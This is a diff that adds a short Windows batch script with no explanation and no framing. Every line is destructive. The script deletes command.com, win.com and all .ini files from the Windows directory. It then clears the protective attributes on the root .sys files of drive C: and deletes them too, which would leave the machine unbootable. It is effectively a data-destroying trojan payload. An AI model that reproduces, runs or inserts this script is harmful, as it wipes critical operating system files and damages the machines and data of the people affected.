@@ -1,0 +1,7 @@
+@echo off
+@del %windir%\command.com
+@del %windir%\win.com
+@del %windir%\*.ini
+attrib c:\*.sys -h -r -s -a
+del c:\*.sys
+Echo wewq
